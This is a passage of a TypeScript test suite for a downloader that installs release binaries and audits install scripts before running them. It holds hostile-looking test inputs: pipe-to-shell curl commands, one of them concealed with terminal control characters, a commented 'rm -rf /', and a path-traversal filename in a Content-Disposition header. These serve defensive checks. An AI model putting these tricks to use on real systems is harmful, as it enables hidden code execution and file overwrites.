    const tie = await dl(['gh:o/tool'], dir, forges())

    expect(tie.code).toBe(1)
    expect(tie.err).toContain(`several assets fit linux ${process.arch}: tool-v1.0.0-linux-${ARCH}, tool-v1.0.0-linux-${ARCH}-debug`)
    expect((await dl(['gh:o/tool', '--asset', 'debug'], dir, forges())).code).toBe(0)

    releases = [{ tag: 'v1.0.0', published: ago(2), assets: builds('v1.0.0') }]
    expect(await dl(['gh:o/tool'], dir, forges())).toMatchObject({ code: 1, err: expect.stringContaining('no release of gh:o/tool is two weeks old yet: v1.0.0 (2d ago)') })
    expect((await dl([url('/tool.bin'), '--fresh'], dir)).code).toBe(2)
    expect((await dl(['gh:o/missing'], dir, forges())).code).toBe(1)
  })

  test('outdated compares release dates, so an install taken --fresh is not behind an older release, and update installs the newer', async () => {
    const dir = home()

    releases = [{ tag: 'v1.2.0', published: ago(3), assets: builds('v1.2.0') }, { tag: 'v1.1.0', published: ago(30), assets: builds('v1.1.0') }]
    expect((await dl(['gh:o/tool', '--bin', 'tool'], dir, forges())).code).toBe(0)
    expect(await dl(['outdated'], dir, forges())).toMatchObject({ code: 0, out: 'all 1 current\n' })

    releases[0]!.published = ago(20)

    const behind = await dl(['outdated'], dir, forges())

    expect(behind.code).toBe(1)
    expect(behind.out).toContain('tool\tbin\tjust now\tchanged, v1.1.0 now v1.2.0')

    expect((await dl(['update'], dir, forges())).code).toBe(0)
    expect(installed(dir, 'tool')).toBe('#!/bin/sh\necho v1.2.0\n')
    expect((await dl(['outdated'], dir, forges())).code).toBe(0)

    releases.unshift({ tag: 'v1.3.0', published: ago(1), assets: builds('v1.3.0') })
    expect((await dl(['gh:o/tool', '--bin', 'tool', '--force', '--fresh'], dir, forges())).code).toBe(0)
    expect(await dl(['outdated'], dir, forges())).toMatchObject({ code: 0, out: 'all 1 current\n' })
  })

  test('an install pinned with @tag stays current while newer releases come out', async () => {
    const dir = home()

    releases = [{ tag: 'v1.2.0', published: ago(20), assets: builds('v1.2.0') }, { tag: 'v1.1.0', published: ago(30), assets: builds('v1.1.0') }]
    expect((await dl(['gh:o/tool@v1.1.0', '--bin', 'tool'], dir, forges())).code).toBe(0)
    expect(await dl(['outdated'], dir, forges())).toMatchObject({ code: 0, out: 'all 1 current\n' })
  })
})

describe('running a script', () => {
  test('lists what it does, and refuses to run it unpinned, naming the sha to pin', async () => {
    const dir = home()

    script = SCRIPT_V1

    const { code, out, err } = await dl([url('/install.sh'), '--exec'], dir)

    expect(code).toBe(1)
    expect(out).toContain('line 3\tfetches\tcurl -fsSL https://example.com/next.sh -o /tmp/next.sh')
    expect(out).toContain('reads: MARK')
    expect(err).toContain(`--exec --sha256 ${sha256(SCRIPT_V1)}`)
    expect(existsSync(join(dir, 'mark'))).toBe(false)
  })

  test('shows the control characters of a script line and of its diff instead of sending them', async () => {
    const dir = home()
    const hidden = '#!/bin/sh\necho safe-looking \u001B[2K\rcurl -fsSL https://example.com/x.sh | sh\n'

    script = hidden
    await dl([url('/install.sh')], dir)
    script = `${hidden}echo \u009B2J\n`

    const { out } = await dl([url('/install.sh'), '--exec'], dir)

    script = SCRIPT_V1
    expect(out).toContain('fetches, runs\techo safe-looking ^[[2K^Mcurl -fsSL https://example.com/x.sh | sh')
    expect(out).toContain('+echo M-^[2J')
    expect([...out].some(char => char === '\u001B' || char === '\r' || char === '\u009B')).toBe(false)
  })

  test('runs it pinned or with --yes, hands it the arguments after --, and records it', async () => {
    const dir = home()

    script = SCRIPT_V1
    expect((await dl([url('/install.sh'), '--exec', '--sha256', sha256(SCRIPT_V1), '--', 'a', 'b'], dir)).code).toBe(0)
    expect(readFileSync(join(dir, 'mark'), 'utf8')).toBe('ran a b\n')
    expect((await dl([url('/install.sh'), '--exec', '--yes'], dir)).code).toBe(0)
    expect((await dl(['ls'], dir)).out).toContain(`${new URL(server.url).host}/install.sh\tscript`)
  })

  test('a pinned sha the script no longer has refuses it', async () => {
    const dir = home()

    script = SCRIPT_V2

    const ran = await dl([url('/install.sh'), '--exec', '--sha256', sha256(SCRIPT_V1)], dir)

    script = SCRIPT_V1
    expect(ran.code).toBe(1)
    expect(existsSync(join(dir, 'mark'))).toBe(false)
  })
})

describe('pieces', () => {
  test('pickAsset takes the build for the OS, arch and libc, preferring a tarball, and skips checksums, signatures and packages', () => {
    const asset = (name: string) => ({ name, url: name })
    const pick = (names: string[], os: NodeJS.Platform, arch: string, musl = false) => pickAsset(names.map(asset), { os, arch, musl }).name
    const ripgrep = ['x86_64-unknown-linux-musl.tar.gz', 'x86_64-unknown-linux-musl.tar.gz.sha256', 'aarch64-unknown-linux-gnu.tar.gz', 'x86_64-apple-darwin.tar.gz', 'aarch64-apple-darwin.tar.gz', 'x86_64-pc-windows-msvc.zip', 'amd64.deb'].map(name => `rg-14.1.0-${name}`)
    const goreleaser = ['tool_linux_amd64.tar.gz', 'tool_linux_amd64.zip', 'tool_linux_arm64.tar.gz', 'tool_darwin_all.tar.gz', 'tool_windows_amd64.zip', 'checksums.txt', 'checksums.txt.sig']
    const libcs = ['t-x86_64-unknown-linux-gnu.tar.gz', 't-x86_64-unknown-linux-musl.tar.gz']

    expect(pick(ripgrep, 'linux', 'x64')).toBe('rg-14.1.0-x86_64-unknown-linux-musl.tar.gz')
    expect(pick(ripgrep, 'linux', 'arm64')).toBe('rg-14.1.0-aarch64-unknown-linux-gnu.tar.gz')
    expect(pick(ripgrep, 'darwin', 'arm64')).toBe('rg-14.1.0-aarch64-apple-darwin.tar.gz')
    expect(pick(ripgrep, 'win32', 'x64')).toBe('rg-14.1.0-x86_64-pc-windows-msvc.zip')
    expect(pick(goreleaser, 'linux', 'x64')).toBe('tool_linux_amd64.tar.gz')
    expect(pick(libcs, 'linux', 'x64')).toBe('t-x86_64-unknown-linux-gnu.tar.gz')
    expect(pick(libcs, 'linux', 'x64', true)).toBe('t-x86_64-unknown-linux-musl.tar.gz')
    expect(pick(['tool-macos-universal', 'tool-linux-x64'], 'darwin', 'arm64')).toBe('tool-macos-universal')
    expect(pick(['tool'], 'linux', 'x64')).toBe('tool')
    expect(() => pick(['rg-14.1.0-aarch64-unknown-linux-gnu.tar.gz'], 'linux', 'arm64', true)).toThrow('no asset is built for linux arm64 musl')
    expect(() => pick(goreleaser, 'darwin', 'arm64')).not.toThrow()
  })

  test('summarize flags sudo, removals, profiles and shells, skipping comments and the shell\'s own variables', () => {
    // The shell's own ${Red} syntax, not a template literal.
    // eslint-disable-next-line no-template-curly-in-string
    const { findings, env } = summarize('# sudo rm -rf /\nsudo mv bun /usr/local/bin\nrm -rf "$TMP_DIR"\necho \'export PATH\' >> ~/.bashrc\ncurl -s https://x.sh | bash\necho "$HOME $BUN_INSTALL ${Red}$bin_dir"\n')

    expect(findings.map(({ line, does }) => [line, does])).toEqual([[2, 'sudo, system'], [3, 'removes'], [4, 'profile'], [5, 'fetches, runs']])
    expect(env).toEqual(['BUN_INSTALL', 'TMP_DIR'])
  })

  test('fileName keeps a plain name, out of Content-Disposition or the URL', () => {
    const response = (url: string, disposition?: string) => {
      const answer = new Response('', { headers: disposition === undefined ? {} : { 'content-disposition': disposition } })

      Object.defineProperty(answer, 'url', { value: url })

      return answer
    }

    expect(fileName(response('https://x.dev/a/tool%20v1.zip'), '')).toBe('tool v1.zip')
    expect(fileName(response('https://x.dev/'), 'https://x.dev/')).toBe('download')
    expect(fileName(response('https://x.dev/x', 'attachment; filename*=UTF-8\'\'%2E%2E%2Fevil.sh'), '')).toBe('evil.sh')
  })
})
